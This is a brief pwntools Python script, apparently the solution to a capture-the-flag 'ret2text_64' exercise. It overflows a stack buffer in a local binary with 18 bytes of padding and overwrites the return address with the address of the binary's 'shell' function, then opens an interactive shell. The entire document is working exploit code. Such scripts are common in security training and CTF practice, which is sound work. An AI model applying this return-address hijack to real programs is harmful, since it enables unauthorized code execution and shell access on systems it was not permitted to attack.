from pwn import *

p = process('./ret2text_64')

elf = ELF("./ret2text_64")

shelladd = elf.sym['shell']

log.success("shell addresss = {}".format(hex(shelladd)))

offset = 18

payload = flat(['a'*offset,p64(shelladd)])

p.sendline(payload)

p.interactive()
